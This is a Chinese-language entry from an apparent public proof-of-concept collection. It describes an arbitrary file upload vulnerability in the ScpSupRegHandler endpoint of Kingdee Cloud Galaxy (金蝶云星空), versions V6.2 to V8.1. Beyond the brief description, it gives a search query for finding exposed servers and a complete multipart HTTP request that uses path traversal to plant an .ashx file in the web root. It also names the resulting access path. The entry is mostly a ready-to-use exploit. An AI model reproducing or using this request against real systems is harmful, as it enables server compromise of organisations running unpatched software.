---
source: "wy876 漏洞文库"
---

# 金蝶OA云星空-ScpSupRegHandler-任意文件上传漏洞

## 金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞

### 漏洞描述：
金蝶OA云星空 ScpSupRegHandler接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取服务器权限

### 漏洞影响：

金蝶云星空企业版私有云、企业版私有云（订阅）、标准版私有云（订阅）三个产品V6.2(含17年12月补丁) 至 V8.1(含23年9月补丁)

### 网络测绘：
```
app="金蝶云星空-管理中心"
```

### 漏洞复现：
登陆页面
POC:
```
POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
Host: 
Accept-Encoding: identity
Content-Length: 973
Accept-Language: zh-CN,zh;q=0.8
Accept: */*Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061

--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="dbId_v"

.
--2ac719f8e29343df94aa4ab49e456061

Content-Disposition: form-data; name="FID"

2022
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/test.ashx."
Content-Type: text/plain

11
--2ac719f8e29343df94aa4ab49e456061-
```


### 文件上传路径
```
访问路径：/K3Cloud/uploadfiles/Test.ashx
```


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
